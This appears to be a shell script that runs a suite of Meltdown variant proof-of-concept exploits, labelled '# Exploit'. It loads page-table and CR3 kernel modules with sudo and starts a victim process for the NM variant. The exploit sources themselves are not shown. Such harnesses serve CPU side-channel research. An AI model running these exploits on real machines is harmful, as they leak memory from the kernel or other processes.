# Get pagesize and threshold
pagesize=`./libcache/get_pagesize`
threshold=`./libcache/get_threshold`
printf "pagesize = $pagesize, threshold = $threshold\n\n"

# Exploit
# meltdown_ac
./meltdown/AC/poc $pagesize $threshold
# meltdown_br
./meltdown/BR/poc $pagesize $threshold
# meltdown_de
./meltdown/DE/poc $pagesize $threshold
# meltdown_gp
sudo insmod libcr3/kernel_module.ko
./meltdown/GP/poc $pagesize $threshold
sudo rmmod libcr3/kernel_module.ko
# meltdown_nm
printf "Launching victim process for Meltdown_NM...\n"
taskset 0x2 ./meltdown/NM/victim &
victimpid=$!
sleep 3
printf "Done...\n"
taskset 0x2 ./meltdown/NM/poc $pagesize $threshold
printf "Terminating victim process for Meltdown_NM...\n"
kill $victimpid > /dev/null 1>&1
sleep 1
printf "Done...\n\n"
# meltdown_p
sudo insmod libpte/module/pteditor.ko
./meltdown/P/poc $pagesize $threshold
sudo rmmod libpte/module/pteditor.ko
# meltdown_pk
./meltdown/PK/poc $pagesize $threshold
# meltdown_rw
./meltdown/RW/poc $pagesize $threshold
# meltdown_ss
./meltdown/SS/poc $pagesize $threshold
# meltdown_ud
./meltdown/UD/poc $pagesize $threshold
# meltdown_us
sudo insmod libpte/module/pteditor.ko
./meltdown/US/poc $pagesize $threshold
sudo rmmod libpte/module/pteditor.ko

